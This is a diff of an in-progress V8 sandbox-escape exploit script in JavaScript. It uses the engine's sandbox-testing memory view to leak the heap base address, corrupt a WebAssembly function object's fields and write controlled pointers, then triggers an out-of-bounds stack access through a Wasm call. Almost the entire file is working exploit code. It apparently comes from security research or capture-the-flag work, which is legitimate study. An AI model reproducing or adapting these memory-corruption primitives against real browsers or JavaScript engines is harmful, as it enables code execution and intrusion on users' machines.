@@ -1,4 +1,4 @@
-// r --expose-gc --allow-natives-syntax --sandbox-testing    --experimental-wasm-memory64 ../../../tests/t7.js
+// r --expose-gc --allow-natives-syntax --sandbox-testing    --experimental-wasm-memory64 ../../../tests/t8.js
 
 d8.file.execute('/home/vult/Desktop/v8/v8/test/mjsunit/wasm/wasm-module-builder.js');
 let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
@@ -14,6 +14,15 @@ function addrOf(obj) {
   function v8_write64(addr, val) {
     return sandboxMemory.setBigInt64(Number(addr), val, true);
   }
+
+console.log("[*] Leak sandbox base address");
+// ================= reading heap_base =============================
+let ofs1 = 0x48;
+let heap_addr = v8_read64(ofs1) - 0x40000n;
+let low_ofs_started_page = heap_addr & 0xffffffffn;
+let high_ofs_started_page = heap_addr & 0xffffffff00000000n;
+console.log("heap_addr: 0x" + heap_addr.toString(16));
+// ================================================================
 
 const builder = new WasmModuleBuilder();
 builder.exportMemoryAs("mem0", 0);
@@ -53,9 +62,19 @@ instance.exports.func0(0n);
 // 0xbn
 // 174n 
 // rsp = rsp + (0xb+1)*8
-v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x4n);
-%SystemBreak();
+// v8_write64(0x43001n, 0x0n)
+v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x13n + 0xcn);
+console.log((heap_addr + 0x200000n).toString(16));
+v8_write64(0x200000n + 0x20n, heap_addr + 0x250000n);
+v8_write64(0x250000n + 0x0EB30n, 0x4141414142424242n);
+// v8_write64(0x200095n, 0x4141414142424242n);
+v8_write64(0x2000d5n, heap_addr + 0x200000n);
+
+
+
+// %SystemBreak();
 
 // trigger out-of-bounds stack
+// console.log("[*] After overwriting length");
 instance.exports.func1(0x4141n);
 
